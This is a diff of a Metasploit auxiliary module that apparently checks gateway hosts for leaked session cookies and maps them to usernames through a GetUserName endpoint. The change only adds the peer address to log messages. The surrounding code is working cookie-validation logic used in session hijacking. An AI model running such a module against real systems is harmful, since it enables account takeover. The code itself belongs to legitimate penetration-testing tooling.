@@ -46,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_user_for_cookie(cookie)
-    vprint_status("Checking cookie: #{cookie}")
+    vprint_status("#{peer} - Checking cookie: #{cookie}")
     res = send_request_cgi(
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'logon/LogonPoint/Authentication/GetUserName'),
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       username = get_user_for_cookie(cookie)
       next unless username
 
-      print_good("Cookie: #{COOKIE_NAME}=#{cookie} Username: #{username}")
+      print_good("#{peer} - Cookie: #{COOKIE_NAME}=#{cookie} Username: #{username}")
       report_vuln
     end
 
@@ -87,10 +87,10 @@ class MetasploitModule < Msf::Auxiliary
     begin
       JSON.parse(res.body)
     rescue JSON::ParserError
-      print_status('The target is vulnerable but no valid cookies were leaked.')
+      print_status("#{peer} - The target is vulnerable but no valid cookies were leaked.")
       report_vuln
     else
-      print_status('The target does not appear vulnerable.')
+      print_status("#{peer} - The target does not appear vulnerable.")
     end
   end
 
